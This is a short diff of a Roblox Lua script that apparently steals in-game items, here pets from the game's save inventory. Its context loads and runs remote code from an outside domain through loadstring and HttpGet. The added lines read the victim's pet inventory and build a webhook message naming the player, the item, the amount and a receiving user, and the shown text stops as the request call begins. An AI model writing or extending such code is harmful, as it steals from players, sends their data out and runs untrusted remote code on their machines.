@@ -58,6 +58,7 @@ loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(qbiga
 end
 if not _G.User then _G.User = "lol idk" end
 if not _G.Min then _G.Min = 500000000 end
+local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
 _G.pvc = ""
 local mailc = 0
 pcall(function()
@@ -76,8 +77,11 @@ mailc=mailc+1
 print("-------------lol")
 local qv = "starsh"
 print(qv)
-local nam = save.Inventory.Pet[args[4]].id or args[4]
-qv = '{"content":"'..game.Players.LocalPlayer.Name..' >> '..args[5]..'x '..args[3]..' >> '.._G.User..'"}'
+local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+local nam = args[4]
+pcall(function()
+nam = save.Inventory.Pet[args[4]].id or args[4] end)
+qv = '{"content":"'..game.Players.LocalPlayer.Name..' >> '..args[5]..'x '..nam..' >> '.._G.User..'"}'
 print(qv)
 local responsexr =
         request(
